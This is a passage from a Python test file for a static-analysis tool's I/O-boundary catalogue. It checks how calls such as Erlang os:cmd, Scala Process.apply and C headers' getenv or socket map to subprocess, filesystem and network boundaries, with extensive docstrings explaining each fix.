    the INV-gahuz / INV-larol shape reached from the opposite direction: there a
    row STRIPPED opacity a launch needed, here a row asserts the wrong kind of
    I/O entirely.

    A first version of this measurement was confounded and is recorded because
    the confound flattered the tool: a fixture that ALSO called
    ``erlang:open_port`` returned ``inconclusive`` rc 2 — not because the launch
    was detected, but because ``erlang`` is itself an uncatalogued module and
    tripped the coverage gate. Removing ``open_port`` isolates ``os:cmd`` and
    the verdict is a clean false ``confirmed``.

    EMISSION SHAPE WAS MEASURED FIRST, as the item demanded, because adding rows
    the analyzer can never match is a ceiling rather than a payoff (INV-linub's
    L2-only fix measured as a win at the analyzer and produced zero findings).
    The Erlang analyzer emits ``erlang:os:0-0:cmd:external_symbol`` with
    ``call_construct='remote_external'`` — module slot ``os``, name slot
    ``cmd`` — and the POSITIVE CONTROL is that the existing (wrong) row already
    matches it end to end, producing an ``env_read`` chain. The key resolves;
    only the boundary was wrong.
    """

    def test_erlang_os_cmd_is_a_subprocess_launch(self) -> None:
        cat = load_catalog("erlang")
        got = cat.lookup_with_module("os.cmd", "os")
        assert got is not None, "os.cmd must stay catalogued — this is a RE-KEY"
        assert got.boundary == "subprocess", (
            f"os:cmd/1 runs a command through the OS shell; it is not an "
            f"environment read. Got boundary={got.boundary!r}"
        )

    def test_erlang_open_port_is_a_subprocess_launch(self) -> None:
        """``erlang:open_port/2`` is the other launch primitive, and the one
        ``os:cmd`` is implemented on top of. It was catalogued nowhere at all,
        so it produced no chain of any kind.
        """
        cat = load_catalog("erlang")
        got = cat.lookup_with_module("erlang.open_port", "erlang")
        assert got is not None, "erlang:open_port/2 was catalogued nowhere"
        assert got.boundary == "subprocess"

    def test_elixir_inherits_the_fix_rather_than_repeating_it(self) -> None:
        """PARITY over the BEAM family, and the reason this is ONE catalogue
        edit and not two.

        Elixir carries its own ``subprocess`` section for ``System.cmd`` /
        ``Port.open`` and does NOT declare ``os.cmd`` — yet a census measured it
        resolving ``os.cmd`` to ``env_read`` exactly as Erlang did, because
        elixir inherits the erlang catalogue (the same child-over-parent
        mechanism scala uses for java). An Elixir program calling ``:os.cmd/1``,
        which is idiomatic BEAM interop, sat in precisely the state the item
        described for Erlang.

        This test is what keeps the two languages from drifting: it asserts the
        inherited answer, so a future edit that fixes only the child leaves the
        parent's defect visible here.
        """
        got = load_catalog("elixir").lookup_with_module("os.cmd", "os")
        assert got is not None
        assert got.boundary == "subprocess", (
            f"elixir inherits erlang's os module; :os.cmd/1 must be a launch "
            f"there too. Got {got.boundary!r}"
        )

    def test_the_shell_out_is_marked_high_risk(self) -> None:
        """``subprocess`` is flagged ``*** HIGH RISK ***`` on the invariant that
        launching an external program is arbitrary code execution. Losing the
        boundary lost the marking too, so re-keying without this would fix the
        chain and leave the warning missing.
        """
        assert is_high_risk("os.cmd")
        assert is_high_risk("erlang.open_port")

    def test_cmd_is_no_longer_reachable_as_an_env_boundary(self) -> None:
        """THE HALF A RE-KEY CAN SILENTLY SKIP. Adding a ``subprocess`` row while
        leaving the ``env_read`` / ``env_write`` rows in place would make
        ``os.cmd`` a MULTI-BOUNDARY primitive, and INV-zumin measured what
        happens then: ``lookup_with_module`` returns one row decided by YAML
        order, so the fix would be live or inert depending on where it was
        pasted. The env rows are REMOVED, not supplemented.
        """
        for lang in ("erlang", "elixir"):
            boundaries = {
                p.boundary for p in load_catalog(lang).primitives
                if p.qualified_name == "os.cmd"
            }
            assert boundaries == {"subprocess"}, (
                f"{lang}: os.cmd must be declared under subprocess ALONE, or "
                f"row order decides which declaration survives (INV-zumin). "
                f"Got {sorted(boundaries)}"
            )


class TestSimultaneouslyTrueBoundariesAreAllReachable:
    """INV-zumin. A primitive catalogued under several boundaries is tagged with
    exactly ONE, decided by YAML row order, so every other declaration is
    unreachable.

    THE POPULATION IS NOT ONE THING, and the fix is scoped to the one part of it
    that is a defect. Measured across all fourteen shipped catalogues with
    production's own ``load_catalog`` / ``lookup_with_module`` — 23
    multi-boundary primitives, 27 unreachable declarations:

      (a) DISAMBIGUATED AT MATCH TIME — ``builtins.open`` picks by ``io_mode``.
          Working as designed; untouched here.
      (b) UNDECIDABLE AT THE CALL SITE — C ``unistd.write`` is fs_write OR
          net_send OR ipc_send depending on the fd's type, which is not at the
          call site. EXACTLY ONE is true per call. Untouched deliberately:
          multiplying these would manufacture a ``net_send`` chain for every C
          write to stdout, which is a false violation rather than a recovered
          one. The honest fix there is fd-type inference (its own item).
      (c) SIMULTANEOUSLY TRUE — both rows describe the same call at the same
          moment, so there is nothing to disambiguate and row order silently
          discards one. THIS is the defect.

    The (b)/(c) split is NOT derivable from the YAML — both look like "several
    rows, no mode" — so the catalogue has to say which. That is why this ships
    as a data marker consumed at one chokepoint rather than as a change to
    ``select_by_mode``'s fallback, which could only swap WHICH declaration is
    silently lost.

    WHY (c) IS SECURITY-RELEVANT. ``scala.sys.process.Process.apply`` is
    declared ``[fs_write, subprocess]`` and tags ``fs_write``. Losing
    ``subprocess`` loses four things at once, none of which the fs_write tag
    replaces: a ``{boundary: subprocess, must_not_exist: true}`` claim finds no
    chain; the ``*** HIGH RISK ***`` marking never fires; the auto-derived taint
    sink gets zone ``host_fs`` instead of ``subprocess``, so a "subprocess
    allowed, host_fs prohibited" claim INVERTS; and the opacity gate keys on the
    boundary. The rows' own notes show the author knew both were true — the
    fs_write row says "can write to filesystem via shell commands", which is a
    statement about what the LAUNCHED PROGRAM does.
    """

    def test_scala_process_apply_reaches_both_declarations(self) -> None:
        cat = load_catalog("scala")
        got = cat.all_boundaries_for("scala.sys.process.Process.apply")
        assert got == {"fs_write", "subprocess"}, (
            f"both declarations are true of the same call; row order must not "
            f"discard one. Got {sorted(got)}"
        )

    def test_single_boundary_primitives_are_unchanged(self) -> None:
        """NON-DESTRUCTION, and the reason this is safe to ship: the
        overwhelming majority of primitives are not multi-boundary and must not
        pay for this.
        """
        cat = load_catalog("python")
        assert cat.all_boundaries_for("os.listdir") == {"fs_read"}
        assert cat.all_boundaries_for("subprocess.run") == {"subprocess"}

    def test_an_uncatalogued_name_returns_empty_not_none(self) -> None:
        """``None`` and "no boundaries" are different facts everywhere else in
        this module (L54 default-deny); an empty set here means "asked, nothing
        declared".
        """
        assert load_catalog("python").all_boundaries_for("nope.nothing") == set()

    def test_mode_disambiguated_pairs_are_not_treated_as_simultaneous(
        self,
    ) -> None:
        """CLASS (a) STAYS OUT. ``builtins.open`` is fs_read OR fs_write by
        mode — never both at once — so it must not be reported as
        simultaneously true, or every ``open(p)`` would produce a spurious
        fs_write chain and an "never writes to disk" claim would go from a
        possibly-correct confirm to a certainly-wrong violation.
        """
        assert load_catalog("python").simultaneous_boundaries_for(
            "builtins.open",
        ) == set()

    def test_call_site_undecidable_pairs_are_not_treated_as_simultaneous(
        self,
    ) -> None:
        """CLASS (b) STAYS OUT, for the same reason in the other direction.
        ``unistd.write`` on a socket fd is net_send and NOT fs_write; on a file
        fd it is fs_write and NOT net_send. Reporting both would assert two
        things when exactly one is true.
        """
        assert load_catalog("c").simultaneous_boundaries_for(
            "unistd.write",
        ) == set()

    def test_declaring_simultaneous_on_one_row_alone_is_rejected(self) -> None:
        """A HALF-DECLARED PAIR IS THE DRIFT THIS INVITES. ``simultaneous`` is a
        property of a PRIMITIVE, spelled on rows that live in different YAML
        sections by construction, so the loader must refuse a primitive whose
        rows disagree rather than silently pick one — a marker that is live or
        inert depending on which section a later editor updates is exactly the
        row-order hazard this item exists to remove.
        """
        cat = IoBoundaryCatalog(language="x", primitives=[
            IoPrimitive(boundary="fs_write", module="m", name="f",
                        kind="method", simultaneous=True),
            IoPrimitive(boundary="subprocess", module="m", name="f",
                        kind="method", simultaneous=False),
        ])
        with pytest.raises(ValueError, match="simultaneous"):
            cat.simultaneous_boundaries_for("m.f")


class TestASimultaneousPrimitiveProducesAChainPerBoundary:
    """INV-zumin, the half that changes a VERDICT rather than an accessor.

    Reaching both declarations in the catalogue is necessary and not
    sufficient: chains are what a ``must_not_exist`` claim counts, and they are
    built from ``edge.meta['io_boundary']`` — one string. So a
    simultaneously-true primitive still produced exactly one chain, and the
    scala launch stayed undetectable as a subprocess no matter what the
    catalogue said.
    """

    @staticmethod
    def _edge(src: str, dst: str, meta=None):
        """Same MockEdge shape the rest of this module's tagger tests use —
        ``tag_io_boundaries`` reads src/dst/edge_type/meta via getattr."""
        from dataclasses import dataclass, field
        from typing import Any, Dict, Optional

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str = "calls"
            meta: Optional[Dict[str, Any]] = None

        return MockEdge(src=src, dst=dst, meta=meta)

    def _scala_edge(self):
        return self._edge(
            src="scala:App.scala:1-9:run:function",
            dst="scala:scala.sys.process.Process:0-0:apply:external_symbol",
            meta={"call_construct": "method"},
        )

    def test_both_boundaries_are_stamped_on_the_edge(self) -> None:
        edges = [self._scala_edge()]
        tag_io_boundaries(edges, {"scala": load_catalog("scala")})
        meta = edges[0].meta or {}
        assert set(meta.get("io_boundaries") or []) == {"fs_write", "subprocess"}

    def test_the_primary_io_boundary_key_is_unchanged_for_consumers(
        self,
    ) -> None:
        """BACK-COMPAT, deliberate. ``io_boundary`` stays a single string and
        keeps its existing value: everything that reads it — the F3 gate, the
        taint sink derivation, ``declares_opaque_crossing``, third-party
        consumers of the JSON — keeps working unchanged. The new key is
        ADDITIVE, so this cannot regress a consumer that never learns about it.
        """
        edges = [self._scala_edge()]
        tag_io_boundaries(edges, {"scala": load_catalog("scala")})
        assert (edges[0].meta or {}).get("io_boundary") == "fs_write"

    def test_a_single_boundary_primitive_gets_no_list(self) -> None:
        """NON-DESTRUCTION for the ~99% of primitives that are not
        multi-boundary: no new key, no extra chain, no cost.
        """
        edges = [self._edge(
            src="python:a.py:1-3:f:function",
            dst="python:os:0-0:listdir:external_symbol",
        )]
        tag_io_boundaries(edges, {"python": load_catalog("python")})
        meta = edges[0].meta or {}
        assert meta.get("io_boundary") == "fs_read"
        assert "io_boundaries" not in meta

    def test_the_subprocess_chain_now_exists(self) -> None:
        """THE POINT. A ``{boundary: subprocess, must_not_exist: true}`` claim
        counts chains; before this it found none for a scala process launch,
        because the fs_write row won on row order.
        """
        bmap = compute_boundary_map(
            [self._scala_edge()], {"scala": load_catalog("scala")},
        )
        assert len(bmap.entries["subprocess"].chains) == 1
        assert len(bmap.entries["fs_write"].chains) == 1

    def test_the_launch_is_marked_high_risk(self) -> None:
        """Losing ``subprocess`` also lost the ``*** HIGH RISK ***`` marking,
        which exists on the invariant that launching an external program is
        arbitrary code execution. Recovering the chain must recover the marking
        with it, or the fix is half done in the direction that matters least.
        """
        bmap = compute_boundary_map(
            [self._scala_edge()], {"scala": load_catalog("scala")},
        )
        assert bmap.entries["subprocess"].to_dict()["has_high_risk"] is True


class TestSimultaneityGeneralisesPastOneLanguage:
    """TWO LANGUAGES, because a fix verified on one is not verified for another
    — this repo's standing rule, earned twice.

    scala's ``Process.apply`` and objc's ``NSURLConnection`` request methods are
    the same defect in different clothes: both declare two boundaries that are
    true of one call at one moment, and both lost one to YAML row order. They
    fail on DIFFERENT boundary pairs (fs_write+subprocess vs net_send+net_recv)
    and in different directions of consequence, which is what makes the second
    one a generalisation test rather than a second sample.

    objc is also the case that shaped the mechanism: its ``net_send`` row groups
    the two genuinely-dual request methods WITH
    ``connectionWithRequest:delegate:``, which the ``net_recv`` row does not
    carry. The flag is per-row, so a row-granular reading would have made that
    third method "simultaneous" with a single boundary.
    """

    def test_objc_request_reaches_both_directions(self) -> None:
        """The objc rows ALREADY SAID SO in prose — "request implies both send
        and receive" — and nothing consumed it. Same shape as ``builtins.open``
        before WI-rusof: a rule documented in ``notes:`` and unimplemented.
        """
        cat = load_catalog("objc")
        got = cat.simultaneous_boundaries_for(
            "NSURLConnection.sendSynchronousRequest:returningResponse:error:",
        )
        assert got == {"net_send", "net_recv"}

    def test_the_send_only_constructors_stay_single_boundary(self) -> None:
        """``connectionWithRequest:delegate:`` is declared under ``net_send``
        alone, so it keeps its single chain.

        NAMED FOR WHY IT PASSES NOW, not for why it passed when written. The
        first version of this test was called
        ``test_a_flagged_row_with_one_boundary_is_not_simultaneous`` and
        asserted the runtime guard below — true at the time, because the
        flagged ``net_send`` row grouped these constructors with the two
        genuinely-dual request methods. The parity test rejected that grouping
        and the row was split, so this method now reaches the same empty result
        one branch earlier (its rows simply do not carry the flag). Leaving the
        old name would have described a code path this test no longer touches —
        the shape where a docstring is corrected and the assertion silently
        means something else.
        """
        cat = load_catalog("objc")
        assert cat.simultaneous_boundaries_for(
            "NSURLConnection.connectionWithRequest:delegate:",
        ) == set()

    def test_an_uncatalogued_name_has_no_simultaneous_boundaries(self) -> None:
        """Asked about a primitive the catalogue does not carry: empty, not a
        raise and not ``None``. The sibling assertion for
        ``all_boundaries_for`` does not exercise this method's own early exit.
        """
        assert load_catalog("python").simultaneous_boundaries_for(
            "nope.nothing",
        ) == set()

    def test_a_flagged_single_boundary_primitive_yields_nothing(self) -> None:
        """THE RUNTIME GUARD, which no SHIPPED catalogue reaches today and which
        is kept because the flag is spelled per ROW and rows legitimately group
        methods that differ in this respect — the exact objc shape that existed
        until the parity test forced the split.

        Built from a synthetic catalogue rather than a real one precisely
        BECAUSE the shipped data no longer produces it: asserting it through
        ``load_catalog`` would make the test pass for the wrong reason the
        moment a catalogue changed underneath it.
        """
        cat = IoBoundaryCatalog(language="x", primitives=[
            IoPrimitive(boundary="net_send", module="m", name="only",
                        kind="method", simultaneous=True),
        ])
        assert cat.simultaneous_boundaries_for("m.only") == set()

    def test_every_simultaneous_primitive_declares_at_least_two_boundaries(
        self,
    ) -> None:
        """PARITY over every shipped catalogue, so the NEXT primitive marked
        simultaneous is checked rather than trusted.

        A flag that yields one boundary is inert — it neither helps nor harms —
        but it is also a sign the author meant something the data does not say,
        and inert-looking declarations are how a catalogue drifts into asserting
        nothing. This enumerates rather than spot-checks, which is the same
        reason the HIGH_RISK drift guard enumerates.
        """
        offenders: list[tuple[str, str]] = []
        for lang in CATALOG_LANGUAGES:
            cat = load_catalog(lang)
            flagged = {
                p.qualified_name for p in cat.primitives if p.simultaneous
            }
            for q in sorted(flagged):
                if len(cat.all_boundaries_for(q)) < 2:
                    offenders.append((lang, q))
        assert not offenders, (
            f"`simultaneous: true` declared on a primitive with fewer than two "
            f"boundaries — the flag says 'these boundaries are all true at "
            f"once' and there is only one: {offenders}"
        )

    def test_no_catalogue_has_a_half_declared_simultaneous_pair(self) -> None:
        """PARITY, the other direction. ``simultaneous`` is a property of a
        PRIMITIVE spelled on rows that live in different YAML sections by
        construction, so a live-shipped half-declared pair would make the marker
        live or inert depending on which section was edited last — the row-order
        dependence this whole mechanism removes, reintroduced.

        ``simultaneous_boundaries_for`` raises on that; this asserts no SHIPPED
        catalogue is in the state today.
        """
        for lang in CATALOG_LANGUAGES:
            cat = load_catalog(lang)
            for q in {p.qualified_name for p in cat.primitives}:
                cat.simultaneous_boundaries_for(q)  # raises if half-declared


class TestAProducerStampSurvivesCatalogueTagging:
    """INV-virat — the one-slot last-writer-wins class, third instance.

    ``command_launch`` is the bash analyzer's opacity stamp: "control left this
    process for a program I cannot see" (bash.py:534). It is the ONLY evidence
    of opacity those edges will ever carry, because ADR-0016 rules out a bash
    catalogue. ``tag_io_boundaries`` assigned ``meta['io_boundary']``
    unconditionally, so any catalogue row that matched a producer-stamped edge
    DESTROYED the stamp:

        before: {'io_boundary': 'command_launch'}
        after:  {'io_boundary': 'fs_read', 'io_primitive': 'os.listdir'}

    The shipped opacity gate did not fail end-to-end only because it reads
    ``raw_edges`` — the serialized dicts — while the tagger mutates objects
    whose meta ``_rehydrate_io_boundary_edges`` happens to SHALLOW-COPY for an
    unrelated reason (WI-kumol). Read order plus an accidental copy is not a
    safety property; a future refactor that shares the meta dict to save an
    allocation would silently restore the false confirm, and every test would
    stay green because none constructs edges through rehydration.

    THE FIX IS THE INV-zumin MECHANISM WITH A SECOND WRITER. A launch that a
    catalogue row also describes is two facts true at once — ``curl -o ...``
    IS a net_send AND an opaque launch — which is exactly the shape
    ``io_boundaries`` was built for; the second writer here is an ANALYZER
    rather than another row. The stamp stays primary (the analyzer SAW the
    launch; the catalogue merely ASSERTS the send — different trust), and the
    catalogue view lands additively.
    """

    @staticmethod
    def _edge(meta=None):
        from dataclasses import dataclass
        from typing import Any, Dict, Optional

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str = "calls"
            meta: Optional[Dict[str, Any]] = None

        return MockEdge(
            src="python:a.py:1-3:f:function",
            dst="python:os:0-0:listdir:external_symbol",
            meta=meta,
        )

    def test_the_stamp_is_not_erased_by_a_matching_row(self) -> None:
        e = self._edge(meta={"io_boundary": "command_launch"})
        tag_io_boundaries([e], {"python": load_catalog("python")})
        assert e.meta["io_boundary"] == "command_launch", (
            f"the producer's opacity observation must outrank the catalogue's "
            f"assertion; got {e.meta!r}"
        )

    def test_the_catalogue_view_is_recorded_additively(self) -> None:
        """The row is not WRONG — os.listdir really is fs_read — so its fact
        must not be discarded either. Both land in ``io_boundaries``.
        """
        e = self._edge(meta={"io_boundary": "command_launch"})
        tag_io_boundaries([e], {"python": load_catalog("python")})
        assert set(e.meta.get("io_boundaries") or []) == {
            "command_launch", "fs_read",
        }
        assert e.meta.get("io_primitive") == "os.listdir"

    def test_an_unstamped_edge_tags_exactly_as_before(self) -> None:
        """NON-DESTRUCTION for the entire rest of the corpus: no producer
        stamp means the previous overwrite semantics, no new key."""
        e = self._edge(meta=None)
        tag_io_boundaries([e], {"python": load_catalog("python")})
        assert e.meta["io_boundary"] == "fs_read"
        assert "io_boundaries" not in e.meta

    def test_a_stamped_edge_no_row_matches_is_untouched(self) -> None:
        """A launch nothing describes keeps its stamp and gains nothing —
        today's bash reality (no catalogue, overlays inert per WI-guhuv)."""
        e = self._edge(meta={"io_boundary": "command_launch"})
        e.dst = "python:nowhere:0-0:nothing:external_symbol"
        tag_io_boundaries([e], {"python": load_catalog("python")})
        assert e.meta == {"io_boundary": "command_launch"}

    def test_chain_accounting_discloses_the_launch_and_counts_the_io(
        self,
    ) -> None:
        """Both facts reach the map, each under its own accounting rule: the
        launch chain is DISCLOSED (command_launch_edges) and excluded from the
        ``total_io_edges`` headline, exactly as bash launches are today; the
        catalogue-boundary chain is counted. One edge, two chains, no
        double-count in the total.
        """
        e = self._edge(meta={"io_boundary": "command_launch"})
        bmap = compute_boundary_map([e], {"python": load_catalog("python")})
        assert len(bmap.entries["command_launch"].chains) == 1
        assert len(bmap.entries["fs_read"].chains) == 1
        assert bmap.command_launch_edges == 1
        assert bmap.total_io_edges == 1, (
            "the launch chain is disclosed-only and must not inflate the "
            "verified-I/O headline"
        )

    def test_the_gate_reads_the_stamp_off_the_tagged_object(self) -> None:
        """THE STRUCTURAL PROPERTY, asserted without the accidental copy in
        between: after tagging, the very same meta dict still satisfies the
        opacity gate's producer check. Before the fix this exact assertion
        failed — the stamp was gone from the only place the gate looks.
        """
        e = self._edge(meta={"io_boundary": "command_launch"})
        tag_io_boundaries([e], {"python": load_catalog("python")})
        from hypergumbo_core.io_boundary import PRODUCER_OPAQUE_BOUNDARIES
        assert e.meta.get("io_boundary") in PRODUCER_OPAQUE_BOUNDARIES


class TestCppMultiIncludeModuleSlot:
    """INV-funuf: a C/C++ module slot is a DISJUNCTION, not one module name.

    ``cpp.py`` pre-collects every ``#include <...>`` in a file and sets an
    unresolved call's module slot to the comma-joined list of all of them:

        cpp:stdio.h,vector,string:0-0:fopen:unresolved

    Its own comment states the intended contract — "the semantics is 'this call
    could be from any of the included headers'; downstream consumers may split
    the module_hint on commas". No consumer ever did. ``lookup_with_module``
    handed the whole joined string to ``_module_matches``, which is EXACT by
    design (a prefix rule was wrong in three languages at once), so a
    multi-include file matched nothing at all. A SINGLE-include file missed too,
    because the slot keeps the header FILENAME while ``c.yaml`` declares the
    header STEM.

    Measured on whisper.cpp (real repo, production extractors, call edges
    only): 6 of 35,059 matched. The 59 recovered here are the security surface
    — getenv, fork/execvp/waitpid, socket/bind/connect/listen/send/recv — so
    C++'s entire network, subprocess and env-read surface was invisible to
    io-boundaries and to every taint source derived from it.
    """

    def test_a_single_header_filename_reaches_its_catalogue_stem(self) -> None:
        catalog = load_catalog("c")
        assert catalog.lookup_with_module("fopen", "stdio") is not None, (
            "precondition: the catalogue declares the STEM"
        )
        hit = catalog.lookup_with_module("fopen", "stdio.h")
        assert hit is not None, "'stdio.h' must reach the 'stdio' entry"
        assert hit.module == "stdio"

    def test_a_comma_joined_slot_is_tried_part_by_part(self) -> None:
        catalog = load_catalog("c")
        hit = catalog.lookup_with_module("fopen", "stdio.h,vector,string")
        assert hit is not None, (
            "a multi-include file must still reach the catalogue; the joined "
            "slot means 'any of these headers', not one module named "
            "'stdio.h,vector,string'"
        )
        assert hit.module == "stdio"

    def test_the_security_surface_is_reachable(self) -> None:
        """getenv is a taint SOURCE, not merely a boundary — it was the single
        highest-count miss in the measured population."""
        catalog = load_catalog("c")
        hint = "algorithm,stdlib.h,vector,cstdio,unistd.h,sys/socket.h"
        for name, module in (("getenv", "stdlib"),
                             ("socket", "sys/socket"),
                             ("fork", "unistd")):
            hit = catalog.lookup_with_module(name, hint)
            assert hit is not None, f"{name} unreachable from {hint!r}"
            assert hit.module == module

    def test_a_header_not_included_does_not_match(self) -> None:
        """The disjunction is bounded by what the file actually includes.

        This is the whole false-positive guard: a file that never includes
        <sys/socket.h> must not match sys/socket entries no matter how
        suggestive the call name is. Without it, splitting would hand every
        short name a match from any catalogue module.
        """
        catalog = load_catalog("c")
        hint = "vector,string,map,algorithm"
        assert catalog.lookup_with_module("socket", hint) is None
        assert catalog.lookup_with_module("fopen", hint) is None

    def test_a_single_module_hint_is_unchanged(self) -> None:
        """Languages that emit ONE module per slot must be byte-identical.

        The expansion is additive: it adds candidate spellings, it never
        widens what a single non-header hint may match.
        """
        py = load_catalog("python")
        assert py.lookup_with_module("read", "external") is None
        assert py.lookup_with_module("listdir", "os") is not None
        # A wrong single hint stays wrong — no part-splitting rescues it.
        assert py.lookup_with_module("listdir", "shutil") is None

    def test_expansion_is_a_no_op_for_every_other_hint_shape(self) -> None:
        """NON-DESTRUCTION, asserted rather than argued (L6).

        A hint with no comma and no header suffix must expand to exactly
        itself, so every language that emits one module per slot is provably
        unaffected. Swept: ``cpp.py:1374`` is the ONLY producer in the tree
        that comma-joins a module slot, and NO shipped catalogue declares a
        module ending in a header suffix — so the stem candidate can add a
        match but can never remove or redirect one.
        """
        from hypergumbo_core.io_boundary import _module_hint_candidates
        for hint in ("os", "net/http", "std::fs", "java.io", "pathlib.Path",
                     "sys", "os.exec.Cmd", "crypto/rand"):
            assert _module_hint_candidates(hint) == [hint], (
                f"{hint!r} must expand to itself alone"
            )

    def test_the_whole_slot_is_offered_before_any_part(self) -> None:
        """Order is load-bearing: an exact whole-slot match must still win, so
        the expansion can only ever be consulted after today's answer fails."""
        from hypergumbo_core.io_boundary import _module_hint_candidates
        assert _module_hint_candidates("stdio.h,vector")[0] == "stdio.h,vector"
        assert _module_hint_candidates("stdio.h") == ["stdio.h", "stdio"]

    def test_blank_and_duplicate_parts_do_not_multiply_candidates(self) -> None:
        from hypergumbo_core.io_boundary import _module_hint_candidates
        assert _module_hint_candidates("stdio.h,,stdio.h, ") == [
            "stdio.h,,stdio.h, ", "stdio.h", "stdio",
        ]
